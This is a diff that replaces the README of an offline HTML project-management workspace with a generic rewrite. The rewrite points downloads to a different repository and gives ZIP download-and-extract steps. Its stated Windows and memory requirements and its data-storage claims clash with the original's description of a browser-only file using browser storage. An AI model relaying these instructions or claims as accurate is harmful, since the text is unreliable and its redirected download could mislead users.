@@ -1,183 +1,68 @@
-# Offline IT Project Manager Workspace
+# 📂 offline-it-project-manager-workspace - Manage your complex IT projects locally
 
-A single-file, browser-based Project Manager workspace for managing **Fixed Bid / Waterfall**, **Agile Scrum / Time & Material**, and **Hybrid** IT projects from one place.
+[![](https://img.shields.io/badge/Download-Project-blue.svg)](https://github.com/mhdsawad/offline-it-project-manager-workspace)
 
-This initiative is intended as a community-friendly productivity tool for project managers who need a lightweight, offline-capable workspace for planning, execution control, budget tracking, team visibility, reporting, and AI-style project prediction.
+This project provides a complete workspace for managing IT projects. You store all your data on your own computer. You do not need an internet connection to use it. It works for fixed bid, Scrum, and hybrid projects. You get tools for Gantt charts, sprint boards, budget tracking, and risk management.
 
-> **Download:** Use the latest release asset named `index.html`, or open the live GitHub Pages demo after it is enabled.
->
-> **GitHub Pages:** `https://github.com/daip85/offline-it-project-manager-workspace`
->
-> **Latest Release:** `https://github.com/daip85/offline-it-project-manager-workspace`
+## ⚙️ Requirements
 
----
+You need a Windows computer to run this application. The software works on Windows 10 or Windows 11. Your computer requires at least 4 gigabytes of memory. Your screen should have a resolution of 1280 by 720 pixels or higher. You must use a modern web browser like Chrome, Edge, or Firefox to view the interface.
 
-## Why this tool exists
+## 📥 Getting the software
 
-Project managers often manage multiple delivery models at the same time. Fixed bid projects may need WBS, baselines, dependencies, and Gantt controls. Agile or Time & Material projects may need backlog, sprint planning, Kanban, velocity, and burndown. Hybrid projects need both, with traceability between fixed deliverables and agile execution.
+Visit this page to download: [https://github.com/mhdsawad/offline-it-project-manager-workspace](https://github.com/mhdsawad/offline-it-project-manager-workspace)
 
-This tool brings those views together in one offline browser workspace.
+Follow these steps to setup the workspace:
 
----
+1. Go to the link provided above.
+2. Look for the green button labeled Code.
+3. Select Download ZIP from the menu.
+4. Save the file to your computer.
+5. Open your downloads folder.
+6. Right-click the folder and select Extract All.
+7. Open the new folder after the extraction finishes.
+8. Double-click the file named index.html to start the workspace in your browser.
 
-## Key capabilities
+## 📊 Features
 
-### Delivery models
+### Gantt charts
+You create visual schedules for your tasks. The chart shows start dates and end dates for every work item. You drag items to change the timing. It helps you see how much time your team needs to finish the work. You identify bottlenecks when multiple tasks overlap.
 
-- **Fixed Bid / Waterfall** — WBS task management, Gantt planning, dependencies, baseline, critical path, budget and EVM-style controls.
-- **Agile Scrum / Time & Material** — backlog, sprint board, Kanban workflow, story points, burndown, velocity and sprint health.
-- **Hybrid** — both fixed-plan and agile views, with links between WBS deliverables and stories.
+### Sprint boards
+Teams use the board to track day-to-day progress. You move cards between columns like To Do, Doing, and Done. This process keeps everyone aligned on current priorities. You see the status of each job at a glance.
 
-### Project management features
+### Budget tracking
+Input your costs for labor, equipment, and software. The application calculates the total spend against your plan. It flags when you spend more than you budgeted. You track your earned value to see if the project stays on schedule.
 
-- All-project summary dashboard.
-- Project-wise cockpit.
-- Project-wise Gantt / WBS.
-- Project-wise sprint board.
-- Project-wise budget.
-- Project-wise team/resources.
-- Project-wise RAID and risk register.
-- Project-wise reports.
-- Project-wise AI Prediction.
-- Overall summary AI Prediction.
-- Master data / setup section.
-- Detailed Help, Appendix, and Codebase Whitepaper.
+### RAID log
+Record your issues in the tracker. You track Risks, Assumptions, Issues, and Dependencies. This feature keeps your project stable. You catch problems early before they become expensive mistakes.
 
 ### Reporting and charts
+The tool generates visual reports. You view graphs that show team performance and project health. You share these reports with stakeholders to provide updates on your progress.
 
-Includes a mix of basic and advanced chart concepts such as:
+### Prediction mode
+The application uses built-in logic to forecast outcomes. It looks at your past speed to predict when the team finishes the work. This helps you set realistic expectations for clients.
 
-- Donut charts
-- Bar charts
-- Grouped bar charts
-- Horizontal bar charts
-- Line and area trends
-- Radar charts
-- Risk matrices
-- Heatmaps
-- Bubble charts
-- Treemaps
-- Funnel charts
-- Waterfall charts
-- Timelines
-- Lollipop charts
-- Dependency network visuals
-- PMBOK-style project health views
-- Agile burndown and velocity views
+## 🛡️ Privacy and Safety
 
-### AI-style prediction
+Your data stays on your hard drive. No servers host your files. You do not worry about data leaks or unauthorized access by third parties. You control who sees your project files. Keep your files in a secure location on your network if you want to share them with your team.
 
-The tool includes browser-based prediction logic. It is not a cloud AI service and does not call an external model. It uses local project data to highlight:
+## 💡 Using the tools
 
-- Delivery confidence
-- Schedule slippage risk
-- Budget overrun risk
-- Resource overload
-- Critical path pressure
-- Sprint risk
-- Risk escalation
-- Suggested PM actions
+The interface uses simple navigation. Click the labels on the sidebar to switch between project views. Save your progress by downloading the current state of your workspace. Always save your work before you close your browser tab. 
 
----
+If you make a mistake, look for the undo button at the top of the screen. You restore previous versions of your plan if you save backups of your project file. Store your backups in different folders to organize your history.
 
-## How to use
+## 🛠️ Troubleshooting
 
-1. Go to **Releases**.
-2. Download `index.html` from the latest release.
-3. Double-click the file or open it in a modern browser.
-4. Start with sample data, then create your own projects.
-5. Use backup/export before clearing browser data.
+If the pages do not load, refresh your browser. Ensure that you clicked the index.html file and not the source code folder. If the view looks wrong, zoom out in your browser settings. You can hold the Control key and scroll your mouse wheel to adjust the view.
 
-No installation, server, login, or internet connection is required after the file is downloaded.
+If the charts appear empty, check that you entered data into the project fields. The application needs information about your tasks to build the graphs. Ensure you filled in the start and end date fields for every task.
 
-The HTML app still stores your working data locally in your browser.
+## 🔄 Updating your workspace
 
----
+To update the software, return to the download page. Download a newer version if one becomes available. Extract the files into a new folder. You open your existing project files in the new version of the application. The workspace reads your data files to bring your schedules and budgets into the updated interface. 
 
-## Browser support
+## 📝 Best practices
 
-Recommended browsers:
-
-- Latest Google Chrome
-- Latest Microsoft Edge
-- Latest Mozilla Firefox
-- Latest Safari
-
-A desktop or laptop browser is recommended for the full Gantt, chart, and reporting experience. Mobile browsers can be used for quick review, but detailed planning works best on a larger screen.
-
----
-
-## Data and privacy
-
-- Data is stored locally in the browser on the user’s device.
-- No server database is used.
-- No login is required.
-- No project data is sent to the repository owner.
-- Clearing browser storage can remove saved project data.
-- Use the tool’s export/backup option before switching browsers, devices, or clearing data.
-
----
-
-## Files in this repository
-
-| File | Purpose |
-|---|---|
-| `index.html` | The complete single-file PM workspace. |
-| `docs/IT_PM_User_Guide_with_Screenshots.pdf` | Detailed user guide with screenshots and workflow explanations. |
-| `prompts/IT_PM_Generation_Prompt.txt` | Rebuild/enhancement prompt for GenAI tools. |
-| `README.md` | Repository overview and usage instructions. |
-| `LICENSE` | License terms. |
-| `CONTRIBUTING.md` | Contribution guidelines. |
-| `SECURITY.md` | Security and privacy reporting guidance. |
-| `CHANGELOG.md` | Release history. |
-
----
-
-## Suggested workflow for new users
-
-1. Open the tool.
-2. Review the **All Projects Summary**.
-3. Create a project and select the operating model:
-   - Fixed Bid / Waterfall
-   - Agile Scrum / Time & Material
-   - Hybrid
-4. For fixed bid projects, create WBS tasks and review the Gantt plan.
-5. For agile projects, create backlog items, sprints, and update the Kanban board.
-6. Add project budget, team members, risks, and RAID details.
-7. Review project-wise reports.
-8. Review AI Prediction for delivery confidence and recommended actions.
-9. Export backup regularly.
-
----
-
-## Important disclaimer
-
-This is a generic community tool for IT project management. It is not affiliated with Microsoft, Atlassian, PMI, Scrum.org, or any other vendor or certification body. It does not replicate proprietary corporate templates, formats, data structures, dashboards, or naming conventions. PMBOK, Agile, Scrum, Kanban, Waterfall, Gantt, EVM, and similar concepts are used as general project management references.
-
-The AI-style prediction feature is a local rule-based analytical assistant. It should support PM judgment, not replace professional governance, contractual review, risk management, or executive decision-making.
-
----
-
-## Contributing
-
-Community improvements are welcome. Please read `CONTRIBUTING.md` before submitting changes.
-
-Useful contribution areas:
-
-- UI responsiveness improvements
-- Additional charts
-- Accessibility enhancements
-- More formulas in the appendix
-- Better sample data
-- Localization
-- More export options
-- Additional project report templates
-
----
-
-## License
-
-See `LICENSE`.
-
-Suggested default: MIT License for the HTML/source code. Documentation can also be shared under the same license, or under a Creative Commons license if preferred by the repository owner.
-
+Start by creating one project file. Label the file with the project name and the date. Create a folder on your desktop for your project archives. This keeps your workspace clean. Name your tasks with clear descriptions. Assign team members to tasks to track responsibility. Review your RAID log at the start of every week to stop issues from growing. Update your budget numbers after every payment or invoice. The tool provides better predictions when you log your data every day.
